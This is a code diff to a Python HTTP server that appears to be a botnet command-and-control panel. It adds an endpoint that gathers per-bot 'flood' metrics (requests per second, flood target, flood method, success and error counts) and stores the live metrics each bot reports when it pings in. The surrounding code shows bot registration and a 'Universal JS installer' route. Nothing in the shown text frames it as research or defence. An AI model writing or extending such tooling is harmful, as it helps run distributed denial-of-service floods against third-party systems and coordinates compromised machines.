@@ -318,6 +318,30 @@ class Handler(BaseHTTPRequestHandler):
                 self._json({"results": list(_results)})
             return
 
+        # ── Live per-agent metrics (aggregated from last ping) ────────────────
+        if path == "/api/agent/metrics":
+            with _bots_lock:
+                metrics_list = []
+                for bot in _bots.values():
+                    m = bot.get("live_metrics", {})
+                    metrics_list.append({
+                        "agent_id":        bot["id"],
+                        "hostname":        bot.get("hostname", "-"),
+                        "ip":              bot.get("ip", "-"),
+                        "last_seen":       bot.get("last_seen", 0),
+                        "flood_active":    m.get("flood_active", 0),
+                        "rps_current":     m.get("rps_current", 0.0),
+                        "requests_total":  m.get("requests_total", 0),
+                        "requests_success":m.get("requests_success", 0),
+                        "requests_errors": m.get("requests_errors", 0),
+                        "latency_p50_ms":  m.get("latency_p50_ms", 0.0),
+                        "latency_p99_ms":  m.get("latency_p99_ms", 0.0),
+                        "flood_target":    m.get("flood_target", ""),
+                        "flood_method":    m.get("flood_method", ""),
+                    })
+            self._json({"metrics": metrics_list})
+            return
+
         # ── Universal JS installer ────────────────────────────────────────────
         if path == "/install.js":
             qs     = parsed.query
@@ -558,9 +582,12 @@ class Handler(BaseHTTPRequestHandler):
 
         elif path == "/api/agent/ping":
             aid = str(data.get("id", "")).strip()
+            live_metrics = data.get("metrics", {})
             with _bots_lock:
                 if aid in _bots:
                     _bots[aid]["last_seen"] = time.time()
+                    if live_metrics:
+                        _bots[aid]["live_metrics"] = live_metrics
             self._json({"ok": True})
 
         elif path == "/api/agent/result":
